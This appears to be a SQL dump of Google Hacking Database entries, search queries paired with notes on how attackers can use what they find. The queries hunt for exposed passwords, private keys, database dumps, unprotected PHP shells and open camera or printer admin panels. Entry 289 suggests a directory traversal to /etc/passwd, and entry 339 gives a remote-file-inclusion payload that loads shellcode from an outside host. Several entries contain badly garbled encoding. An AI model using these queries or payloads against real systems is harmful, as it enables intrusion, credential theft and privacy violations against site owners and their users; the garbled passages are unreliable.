(283, 'inurl:ospfd.conf intext:password -sample -test -tutorial -download', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=inurl%3Aospfd.conf+intext%3Apassword+-sample+-test+-tutorial+-download&btnG=Search', 1567, '2004-06-10', 'GNU Zebra is free software that manages TCP/IP based routing protocols. It supports BGP-4 protocol as well as RIPv1, RIPv2 and OSPFv2.The ospfd.conf uses the same format as the cisco config files. There is an enable password (plain text or encrypted) and ipv6 tunnel definitions, hostnames, ethernet interface names, ip routing information, etc.', '2004-06-10', NULL, NULL),
(285, 'inurl:ccbill filetype:log', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=filetype%3Alog+inurl%3Accbill', 2221, '2004-06-18', 'CCBill.com sells E-tickets to online entertainment and subscription-based websites. CCBill.com gives consumers access to the hottest entertainment sites on the World Wide Web. The word "hot" in this context seems apropriate when considering the type of sites that use e-tickets :)CCBill log files contain usernames and password information, but are protected with DES encryption. An attacker can crack these using the information provided on this site: http://www.jaddo.net/forums/index.php?&amp;act=ST&amp;f=19&amp;t=4242.', '2004-06-18', NULL, NULL),
(286, 'filetype:mdb inurl:users.mdb', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Amdb+inurl%3Ausers.mdb&btnG=Google+Search', 2062, '2004-06-16', 'Everyone has this problem, we need to remember many passwords to access the resources we use. Some believe it is a good solution to use Microsoft Access as a password database..An attacker can find and download those mdb files easily with Google. This search tries to find such "user" databases. Some are password protected, many are not. Weee!', '2004-06-16', NULL, NULL),
(287, 'intitle:"Error using Hypernews" "Server Software"', 'http://www.google.com/search?q=intitle:%22Error+using+Hypernews%22+%22Server+Software%22&num=100&hl=en&lr=&ie=UTF-8&safe=off&filter=0', 1569, '2004-06-15', 'HyperNews is a cross between the WWW and Usenet News. Readers can browse through the messages written by other people and reply to those messages. This search reveals the server software, server os, server account user:group (unix), and the server administrator email address. Many of these messages also include a traceback of the files and linenumbers and a listing of the cgi ENV variables. An attacker can use this information to prepare an attack either on the platform or the script files.', '2004-06-15', NULL, NULL),
(289, 'filetype:php inurl:"viewfile" -"index.php" -"idfil', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Aphp+inurl%3A%22viewfile%22+-%22index.php%22+-%22idfil&btnG=Google+Search', 2213, '2004-06-16', 'Programmers do strange things sometimes and forget about security. This search is the perfect example. These php scripts are written for viewing files in the web directory (e.g. ww.XXX.com/viewfile.php?my_howto.txt --&gt; will show you the my_howto.txt).An attacker can check for buggy php scripts wich allow you to view any file on the system (with webservers permissions). Try the good, old directory traversal trick: "../../../". You have to know the filename and location, but that''s not a big problem (/etc/passwd anyone ?).', '2004-06-16', NULL, NULL),
(291, 'Outlook Web Access (a better way)', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=active&q=inurl%3A%22exchange%2Flogon.asp%22+OR+intitle%3A%22Microsoft+Outlook+Web+Access+-+Logon%22&btnG=Search', 1492, '2004-06-18', 'According to Microsoft "Microsoft (R) Outlook (TM) Web Access is a Microsoft Exchange Active Server Application that gives you private access to your Microsoft Outlook or Microsoft Exchange personal e-mail account so that you can view your Inbox from any Web Browser. It also allows you to view Exchange server public folders and the Address Book from the World Wide Web. Anyone can post messages anonymously to public folders or search for users in the Address Book. " Now, consider for a moment and you will understand why this could be potentially bad.', '2004-06-18', NULL, NULL),
(293, 'Looking Glass', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%22Looking+Glass%22+%28inurl%3A%22lg%2F%22+%7C+inurl%3Alookingglass%29+&btnG=Search', 1256, '2004-06-22', 'A Looking Glass is a CGI script for viewing results of simple queries executed on remote routers. There are many Looking Glass sites all over the world. Some are password protected, many are not.An attacker use this to gather information about the network.', '2004-06-22', NULL, NULL),
(294, 'CGI:IRC Login', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Acgi+inurl%3A%22irc.cgi%22+%7C+intitle%3A%22CGI%3AIRC+Login%22+&btnG=Google+Search', 1096, '2004-06-22', 'CGIIRC is a web-based IRC client. Using a non-transparent proxy an attacker could communicate anonymously by sending direct messages to a contact. Most servers are restricted to one irc server and one or more default channels and will not let allow access to anything else.', '2004-06-22', NULL, NULL),
(295, 'filetype:ctt ctt messenger', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Actt+ctt+messenger&btnG=Search', 1521, '2004-06-22', 'MSN Messenger uses the file extension *.ctt when you export the contact list. An attacker could use this for social enginering tricks.', '2004-06-22', NULL, NULL),
(296, 'intitle:"Error Occurred While Processing Request" +WHERE (SELECT|INSERT) filetype:cfm', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22Error+Occurred+While+Processing+Request%22+%2BWHERE+%28SELECT%7CINSERT%29+filetype%3Acfm&btnG=Search', 1403, '2004-06-24', 'Cold fusion error messages logging the SQL SELECT or INSERT statements and the location of the .cfm file on the webserver.An attacker could use this information to quickly find SQL injection points.', '2004-06-24', NULL, NULL),
(297, 'ht://Dig htsearch error', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22htsearch+error%22+ht%3A%2F%2FDig+error&btnG=Search', 1416, '2004-06-24', 'The ht://Dig system is a complete world wide web indexing and searching system for a domain or intranet. A list of publically available sites that use ht://Dig is available at http://www.htdig.org/uses.htmlht://Dig 3.1.1 - 3.2 has a directory traversal and file view vulnerability as described at http://www.securityfocus.com/bid/1026. Attackers can read arbitrary files on the system. If the system is not vulnerable, attackers can still use the error produced by this search to gather information such as administrative email, validation of a cgi-bin executable directory, directory structure, location of a search database file and possible naming conventions.', '2004-06-24', NULL, NULL),
(298, 'VP-ASP Shopping Cart XSS', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Aasp+inurl%3A%22shopdisplayproducts.asp%22&btnG=Google+Search', 1109, '2004-06-25', 'VP-ASP (Virtual Programming - ASP) has won awards both in the US and France. It is now in use in over 70 countries. VP-ASP can be used to build any type of Internet shop and sell anything.According to http://www.securityfocus.com/bid/9164/discussion/ a vulnerability has been reported to exist in VP-ASP software that may allow a remote user to launch cross-site scripting attacks. A remote attacker may exploit this issue to potentially execute HTML or script code in the security context of the vulnerable site.The vendor has released fixes to address this issue. It is reported that the fixes are applied to VP-ASP 5.0 as of February 2004. An attacker could also search Google for intitle:"VP-ASP Shopping Cart *" -"5.0" to find unpatched servers.', '2004-06-25', NULL, NULL),
(299, 'Unreal IRCd', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Aconf+inurl%3Aunrealircd.conf+-cvs+-gentoo&btnG=Search', 1283, '2004-07-06', 'Development of UnrealIRCd began in 1999. Unreal was created from the Dreamforge IRCd that was formerly used by the DALnet IRC Network and is designed to be an advanced IRCd. Unreal can run on several operating systems. Unreal works on most *nix OSes including Linux, BSD, MacOS X, Solaris, and HP-UX. Unreal also works on Windows (95/98/ME NT4/2K/XP/2003).This search finds configuration files to Unreal IRCd. An attacker can use these to possibly determine the oper passwd. Be warned that there are samples in the results.', '2004-07-06', NULL, NULL),
(300, 'OWA Public Folders (direct view)', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=inurl%3A%2Fpublic%2F%3FCmd%3Dcontents&btnG=Search', 1811, '2004-06-25', 'This search looks for Outlook Web Access Public Folders directly. These links open public folders or appointments. Of course there are more ways to find OWA, but the results from this search are different, it just depends which link Google has crawled.An attacker can often read all the messages anonymously or even post messages to the folders. In other cases a login will be required. This is a leak of confidential company information and may give hints for social enginering tricks.', '2004-06-25', NULL, NULL),
(301, 'VP-ASP Shop Administrators only', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&&q=inurl%3A%22shopadmin.asp%22+%22Shop+Administrators+only%22', 8398, '2004-06-25', 'VP-ASP (Virtual Programming - ASP) has won awards both in the US and France. It is now in use in over 70 countries. VP-ASP can be used to build any type of Internet shop and sell anything.It has been reported that the Shopping Cart Administration script is vulnerable to XSS and SQJ injection, resulting in exposure of confidential customer information like credit card details. More information on this attack is available at http://securitytracker.com/alerts/2002/May/1004384.html', '2004-06-25', NULL, NULL),
(302, 'Microsoft Money Data Files', 'http://www.google.com/search?q=%3Cfiletype:mny+mny%3E&hl=en&lr=&ie=UTF-8&safe=off&filter=0', 1413, '2004-07-02', 'Microsoft Money 2004 provides a way to organize and manage your personal finances (http://www.microsoft.com/money/). The default file extension for the ''Money Data Files'' is *.mny.A free trial version can be downloaded from MS. It is reported that the password protection (linked to passport in the new versions) for these data files can be cracked with a program called "Passware".', '2004-07-02', NULL, NULL),
(303, 'Environment vars', 'http://www.google.com/search?q=HTTP_USER_AGENT=Googlebot&ie=UTF-8&oe=UTF-8', 1245, '2004-07-02', 'This is a generic way of grabbing those CGI-spewed environmental var lists. To narrow to things down, an attacker could use any of the following: SERVER_SIGNATURE, SERVER_SOFTWARE, TNS_ADMIN, DOCUMENT_ROOT, etc.', '2004-07-02', NULL, NULL),
(304, 'MySQL tabledata dumps', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%22%23+Dumping+data+for+table+%28username%7Cuser%7Cusers%7Cpassword%29%22+-site%3Amysql.com+-cvs&btnG=Search', 1539, '2004-07-06', 'sQL database dumps. LOTS of data in these. So much data, infact, I''m pressed to think of what else an ev1l hax0r would like to know about a target database.. What''s that? Usernames and passwords you say? Patience, grasshopper..... Note: this is a cleanup version of an older googledork entry.', '2004-07-06', NULL, NULL),
(305, 'Welcome to ntop!', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22Welcome+to+ntop%21%22&btnG=Search', 1664, '2004-07-06', 'Ntop shows the current network usage. It displays a list of hosts that are currently using the network and reports information concerning the IP (Internet Protocol) traffic generated by each host. An attacker may use this to gather information about hosts and services behind the firewall.', '2004-07-06', NULL, NULL),
(306, 'vBulletin version 3.0.1 newreply.php XSS', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%22Powered+by%3A+vBulletin+*+3.0.1%22+inurl%3Anewreply.php&btnG=Search', 1440, '2004-07-02', 'vBulletin is a customizable forums package for web sites. It has been written in PHP and is complimented with MySQL. While a user is previewing the post, both newreply.php and newthread.php correctly sanitize the input in ''Preview'', but not Edit-panel. Malicious code can be injected by an attacker through this flaw. More information at http://www.securityfocus.com/bid/10612/.', '2004-07-02', NULL, NULL),
(307, 'psyBNC config files', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Aconf+inurl%3Apsybnc.conf++%22USER.PASS%3D%22&btnG=Search', 1585, '2004-07-06', 'psyBNC is an IRC-Bouncer with many features. It compiles on Linux, FreeBSD, SunOs and Solaris. The configuration file for psyBNC is called psybnc.conf (duh).An attacker can use the password, host and portinformation in this file to bounce his IRC connection through these bouncers, providing some privacy or just to show off some fancy irc hostname that are usually linked to those IP addresses.', '2004-07-06', NULL, NULL),
(308, 'intitle:"View and Configure PhaserLink"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3A%22View+and+Configure+PhaserLink%22&btnG=Search', 2308, '2004-07-08', 'These printer''s configuration is wide open. Attackers can change just about any value through this control panel. Take it from FX, printers can be dangerous too! Besides, a POP3 server, username and password can be entered into these things! =)', '2004-07-08', NULL, NULL),
(309, 'intext:"Warning: Failed opening" "on line" "include_path"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intext%3A%22Warning%3A+Failed+opening%22+%22on+line%22+%22include_path%22', 1342, '2004-07-09', 'These error messages reveal information about the application that created them as well as revealing path names, php file names, line numbers and include paths.', '2004-07-09', NULL, NULL),
(310, 'filetype:php inurl:"webeditor.php"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=filetype%3Aphp+inurl%3A%22webeditor.php%22', 1562, '2004-07-09', 'This is a standard login portal for the webadmin program.', '2004-07-09', NULL, NULL),
(312, 'sony SNC-RZ30 Network Cameras', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3Asnc-rz30+inurl%3Ahome%2F+&btnG=Search', 2157, '2004-07-10', 'sony NC RZ30 camera''s require a java capable browser. The admin panel is found at http://[sitename]/home/l4/admin.html.', '2004-07-10', NULL, NULL),
(313, 'seyeon FlexWATCH cameras', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3Aflexwatch+intext%3A%22Home+page+ver%22&btnG=Search', 2470, '2004-07-10', 'seyeon provides various type of products and software to build up a remote video monitoring and surveillance system over the TCP/IP network. FlexWATCHÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ Network video server series has built-in Web server based on TCP/IP technology. It also has an embedded RTOS.The admin pages are at http://[sitename]/admin/aindex.htm.', '2004-07-10', NULL, NULL),
(314, 'sony SNC-RZ20 network cameras', 'http://www.google.com/search?hl=en&ie=UTF-8&q=intitle%3Asnc-z20+inurl%3Ahome%2F+&btnG=Google+Search', 2123, '2004-07-10', 'sony NC RZ20 cameras, only one result for this cam at the moment, a nice street view from a skyscraper.', '2004-07-10', NULL, NULL),
(315, 'Mobotix netcams', 'http://www.google.com/search?q=%28intext%3A%22MOBOTIX+M1%22+%7C+intext%3A%22MOBOTIX+M10%22%29+intext%3A%22Open+Menu%22+Shift-Reload&btnG=Search', 2418, '2004-07-10', 'Mobotix netcams use the thttpd-2.x. server (http://www.acme.com/software/thttpd/). The latest version today is 2.25b, but most cams run older versions. They produce a rather nice image quality.Moderator note: this search was found by L0om and cleaned up by Wolveso.', '2004-07-10', NULL, NULL),
(316, 'Panasonic WJ-NT104 netcams', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22WJ-NT104+Main+Page%22&btnG=Search', 2478, '2004-07-10', 'The Panasonic WJ-NT104 allows easy monitoring with a conventional browser. More vendor information is available at hxxp://www.panasonic.ca/English/Broadcast/security/transmission/wjnt104.asp', '2004-07-10', NULL, NULL),
(317, 'exported email addresses', 'http://www.google.com/search?q=e-mail+address+filetype%3Acsv+csv', 1459, '2004-07-12', 'Loads of user information including email addresses exported in comma separated file format (.cvs). This information may not lead directly to an attack, but most certainly counts as a serious privacy violation.', '2004-07-12', NULL, NULL),
(318, 'phpWebMail', 'http://www.google.com/search?hl=en&lr=&safe=off&q=filetype%3Aphp+login+%28intitle%3AphpWebMail%7CWebMail%29&btnG=Search', 1424, '2004-07-12', 'PhpWebMail is a php webmail system that supports imap or pop3.    It has been reported that PHPwebmail 2.3 is vulnerable. The vulnerability allows phpwebmail users to gain access to arbitrary file system by changing the parameters in the URL used for sending mail (send_mail.php). More info at http://eagle.kecapi.com/sec/fd/phpwebmail.html.', '2004-07-12', NULL, NULL),
(319, 'Invision Power Board SSI.PHP SQL Injection', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&q=%22Powered+by+Invision+Power+Board%28U%29+v1.3+Final%22&btnG=Search', 1072, '2004-07-12', 'Invision Power Board is reported prone to an SQL injection vulnerability in its ssi.php script. Due to improper filtering of user supplied data, ssi.php is exploitable by attackers to pass SQL statements to the underlying database. The impact of this vulnerability depends on the underlying database. It may be possible to corrupt/read sensitive data, execute commands/procedures on the database server or possibly exploit vulnerabilities in the database itself through this condition. Version 1.3.1 Final of Invision Power Board is reported vulnerable. Other versions may also be affected as well.More info: http://www.securityfocus.com/bid/10511/info/', '2004-07-12', NULL, NULL),
(320, 'Analysis Console for Incident Databases', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=ACID+%22by+Roman+Danyliw%22+filetype%3Aphp&btnG=Search', 1357, '2004-07-12', 'ACID stands for for "Analysis Console for Incident Databases". It is a php frontend for the snort intrusion detection system database.These pages can be used by attackers to view network attacks that have occurred against the target. Using this information, an attacker can craft an attack and glean network information including vulnerabilities, open ports, ip addresses, network layout, existance of firewall and IDS systems, and more.', '2004-07-12', NULL, NULL),
(321, 'Index of phpMyAdmin', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22index+of+%2Fphpmyadm', 2511, '2004-07-12', 'phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the Web. Currently it can create and drop databases, create/drop/alter tables, delete/edit/add fields, execute any SQL statement, manage keys on fields (http://sourceforge.net/projects/phpmyadmin/).An attacker can use this search to find phpMyAdmin enabled MySQL servers by using the "index of /" method. Consider this an alternative way an attacker could find them besides the older Googledorks for phpMyAdmin.', '2004-07-12', NULL, NULL),
(322, 'Comersus.mdb database', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=inurl%3A%22%2Fdatabase%2Fcomersus.mdb%22&btnG=Search', 11267, '2004-07-12', 'Comersus is an e-commerce system and has been installed all over the world in more than 20000 sites. Using Comersus does not require that you know any programming language. BackOffice+ allows you to define virtually all properties of your on-line store through an intuitive, point-&amp;-click interface.This search goes directly for one of the MS Access files used by the shopping cart. Searching Google and the well know security sites for Comersus reveals more security problems.', '2004-07-12', NULL, NULL),
(323, 'Public PHP FileManagers', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%22Powered+by+PHPFM%22+filetype%3Aphp+-username&btnG=Search', 3686, '2004-07-12', 'PHPFM is an open source file manager written in PHP. It is easy to set up for a beginner, but still easy to customize for the more experienced user. The built-in login system makes sure that only people with the right username and password gains access to PHPFM, however, you can also choose to disable the login system and use PHPFM for public access. It can currently: create, rename and delete folders; create, upload, rename, download and delete files; edit text files; view image files; sort files by name, size, permissions and last modification date both ascending and descending; communicate in more languages. This search finds those "public" versions of PHPFM. An attacker can use them to manage his own files (phpshell anyone ?).PS: thanks to j0hnny for the public access angle :)', '2004-07-12', NULL, NULL),
(324, 'private key files (.key)', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=BEGIN+%28CERTIFICATE%7CDSA%7CRSA%29+filetype%3Akey&btnG=Search', 1380, '2004-07-12', 'This search will find private key files... Private key files are supposed to be, well... private.', '2004-07-12', NULL, NULL),
(325, 'inurl:explorer.cfm inurl:(dirpath|This_Directory)', 'http://www.google.com/search?hl=en&lr=&c2coff=1&client=firefox-a&q=inurl%3Aexplorer.cfm+inurl%3A%28dirpath%7CThis_Directory%29&btnG=Search', 2312, '2004-10-31', 'Filemanager without authentication.', '2004-10-31', NULL, NULL),
(326, 'private key files (.csr)', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=BEGIN+%28CERTIFICATE%7CDSA%7CRSA%29+filetype%3Acsr&btnG=Search', 1356, '2004-07-12', 'This search will find private key files... Private key files are supposed to be, well... private.', '2004-07-12', NULL, NULL),
(327, 'PHP Shell (unprotected)', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22PHP+Shell+*%22+%22Enable+stderr%22+filetype%3Aphp&btnG=Search', 6813, '2004-07-12', 'PHP Shell is a shell wrapped in a PHP script. It''s a tool you can use to execute arbiritary shell-commands or browse the filesystem on your remote Web server. This replaces, to a degree, a normal telnet-connection. You can use it for administration and maintenance of your Web site using commands like ps, free, du, df, and more.If these shells aren''t protected by some form of authentication, an attacker will basicly *own* the server. This search finds such unprotected phpshells by looking for the keyword "enable stderr".', '2004-07-12', NULL, NULL),
(328, 'NickServ registration passwords', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=%22Your+password+is+*+Remember+this+for+later+use%22', 1582, '2004-07-12', 'NickServ allows you to "register" a nickname (on some IRC networks) and prevent others from using it. Some channels also require you to use a registered nickname to join.This search contains the the nickserv response message to a nick registration. Lots of example sites, but some that aren''t... you can see which ones are fake or not in the search (some are like, your_password, while other are more realistic ones).', '2004-07-12', NULL, NULL),
(329, 'Red Hat Unix Administration', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22Page+rev+*%2F*%2F*%22+inurl%3A%22admin&btnG=Search', 1360, '2004-07-12', 'Red Hat UNIX Administration Pages. This search detects the fixed title for the admin pages on certain Red Hat servers. A login is required to access them, but an attacker could use this search to determine the operating system used by the server.', '2004-07-12', NULL, NULL),
(330, 'inurl:ssl.conf filetype:conf', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=inurl%3Assl%2Econf+filetype%3Aconf', 1320, '2004-07-15', 'The information contained in these files depends on the actual file itself. SSL.conf files contain port numbers, ssl data, full path names, logging information, location of authentication files, and more. Other conf files based on this name may contain similar information. Attackers can use this information against a target in various ways.', '2004-07-15', NULL, NULL),
(331, 'PHP application warnings failing "include_path"', 'http://www.google.com/search?hl=en&q=PHP+application+warnings+failing+%22include_path%22', 1594, '2004-07-14', 'These error messages reveal information about the application that created them as well as revealing path names, php file names, line numbers and include paths.PS: thanks to fr0zen for correcting the google link for this dork (murfie, 24 jan 2006).', '2004-07-14', NULL, NULL),
(332, '"Internal Server Error" "server at"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=%22Internal+Server+Error%22+%22server+at%22', 1383, '2004-07-16', 'We have a similar search already, but it relies on "500 Internal Server" which doesn''t appear on all errors like this one. It reveals the server administrator''s email address, as well as a nice server banner for Apache servers. As a bonus, the webmaster may have posted this error on a forum which may reveal (parts of) the source code.', '2004-07-16', NULL, NULL),
(333, 'inurl:lilo.conf filetype:conf password -tatercounter2000 -bootpwd -man', 'http://www.google.com/search?hl=en&ie=UTF-8&q=inurl%3Alilo.conf+filetype%3Aconf+password+-tatercounter2000+-bootpwd+-man&btnG=Google+Search', 1573, '2004-07-16', 'LILO is a general purpose boot manager that can be used to boot multiple operating systems, including Linux. The normal configuration file is located in /etc/lilo.conf. Each bootable image can be protected by a password if needed. Please note that all searches for configuration files will contain at least some false positives.', '2004-07-16', NULL, NULL),
(334, 'filetype:php inurl:"logging.php" "Discuz" error', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Aphp+inurl%3A%22logging.php%22+%22Discuz%22+error&btnG=Search', 1516, '2004-07-16', 'Discuz! Board error messages related to MySQL. The error message may be empty or contain path information or the offending SQL statement. All discuz! board errors seem to be logged by this php file.An attacker can use this to reveal parts of the database and possibly launch a SQL attack (by filtering this search including SELECT or INSERT statements).', '2004-07-16', NULL, NULL),
(335, 'intitle:"Microsoft Site Server Analysis"', 'http://www.google.com/search?hl=en&ie=UTF-8&q=intitle%3A%22Microsoft+Site+Server+Analysis%22&btnG=Google+Search', 1318, '2004-07-16', 'Microsoft discontinued Site Server and Site Server Commerce Edition on June 1, 2001 with the increasing adoption of its successor, Microsoft Commerce Server 2000 Server and Microsoft Commerce Server 2002. There are still some installations online however. An attacker may use these reports to gather information about the directory structure and possibly identify script files.', '2004-07-16', NULL, NULL),
(336, 'intitle:"Index of" passwords modified', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=intitle%3A%22Index+of%22+passwords+modified&btnG=Search', 29258, '2004-07-16', 'These directories are named "password." I wonder what you might find in here. Warning: sometimes p0rn sites make directories on servers with directories named "password" and single html files inside named things liks "horny.htm" or "brittany.htm." These are to boost their search results. Don''t click them (unless you want to be buried in an avalanche of p0rn...Moderator note: This is a cleanup of a previous googledork, improving the results by using "intitle" and an extra keyword from the index page (in this case modified).', '2004-07-16', NULL, NULL),
(337, 'index.of.password', 'http://www.google.com/search?q=inurl:index.of.password&hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&start=0&', 6170, '2004-07-16', 'These directories are named "password." I wonder what you might find in here. Warning: sometimes p0rn sites make directories on servers with directories named "password" and single html files inside named things liks "horny.htm" or "brittany.htm." These are to boost their search results. Don''t click them (unless you want to be buried in an avalanche of p0rn...Moderator note: This googledork has expired ! See also:http://johnny.ihackstuff.com/index.php?module=ProdReviews&amp;func=showcontent&amp;id=380', '2004-07-16', NULL, NULL),
(338, '"powered by webcamXP" "Pro|Broadcast"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%22powered+by+webcamXP%22+%22Pro%7CBroadcast%22&btnG=Search', 4748, '2004-07-16', 'webcamXP PRO:http://www.webcamxp.com/productsadv.htmlThis is the most advanced version of the software. It has all the features of the other versions (including advanced users management, motion detector, and alerts manager) plus remote administration and external server notification when going offline/online.', '2004-07-16', NULL, NULL),
(339, '"powered by sphider" -exploit -ihackstuff -www.cs.ioc.ee', 'http://www.google.com/search?num=100&hl=en&lr=&q=%22powered+by+sphider%22+-exploit+-ihackstuff+-www.cs.ioc.ee', 1029, '2006-04-15', 'dork: "powered by sphider" a vulnerable search engine script arbitrary remote inclusion, poc: http://[target]/[path]/admin/configset.php?cmd=ls%20-la&amp;settings_dir=http://somehost.com where on somehost.com you have a shellcode in /conf.php/index.html references:http://retrogod.altervista.org/sphider_13_xpl_pl.htmlhttp://secunia.com/advisories/19642/', '2006-04-15', NULL, NULL),
(340, '"by Reimar Hoven. All Rights Reserved. Disclaimer" | inurl:"log/logdb.dta"', 'http://www.google.com/search?hl=en&q=%22by+Reimar+Hoven.+All+Rights+Reserved.+Disclaimer%22+%7C+inurl%3A%22log%2Flogdb.dta%22+&btnG=Cerca+con+Google&meta=&num=100&filter=0', 1225, '2006-04-15', 'dork: "by Reimar Hoven. All Rights Reserved. Disclaimer" | inurl:"log/logdb.dta" this is for PHP Web Statistik script, you can go to: http://[target]/[path_to]/log/logdb.dta to see clear text logs', '2006-04-15', NULL, NULL),
(341, '"ORA-12541: TNS:no listener" intitle:"error occurred"', 'http://www.google.com/search?q=%22ORA-12541:+TNS:no+listener%22+intitle:%22error+occurred%22&ie=UTF-8&oe=UTF-8', 1596, '2004-07-16', 'In many cases, these pages display nice bits of SQL code which can be used by an attacker to mount attacks against the SQL database itself. Other pieces of information revealed include path names, file names, and data sources.', '2004-07-16', NULL, NULL),
(342, 'intitle:"Live View / - AXIS"', 'http://www.google.com/search?q=intitle%3A%22Live+View+%2F+-+AXIS%22&btnG=Google+Search', 9755, '2004-07-19', 'These AXIS cams seem to run their own http server (Boa/0.94.13). The setup button can be hidden. The devices ship with a default password pair (quoting from the FAQ): "By default, the username will be ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¹Ãƒâ€¦Ã¢â‚¬Å“rootÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ and the password will be ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¹Ãƒâ€¦Ã¢â‚¬Å“passÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢. If these are not the current values, performing a factory default on the unit will reset the password to ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¹Ãƒâ€¦Ã¢â‚¬Å“passÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢."Some models found in this search:- AXIS 205 version 4.0x- AXIS 210 Network Camera version: 4.0x- AXIS 241S Video Server version: 4.0x- AXIS 241Q Video Server version 4.0x', '2004-07-19', NULL, NULL),
(345, '"sets mode: +s"', 'http://www.google.com/search?q=%22sets+mode:+%2Bs%22&ie=UTF-8&oe=UTF-8', 1639, '2004-07-19', 'This search reveals secret channels on IRC as revealed by IRC chat logs.', '2004-07-19', NULL, NULL),
(346, 'intitle:"BorderManager Information alert"', 'http://www.google.com/search?q=intitle%3A%22BorderManager+Information+alert%22&btnG=Search', 3005, '2004-07-19', 'This is an Informational message produced by the Novell BorderManager firewall/proxy server. Attackers can located perimeter defence systems with this query.', '2004-07-19', NULL, NULL),
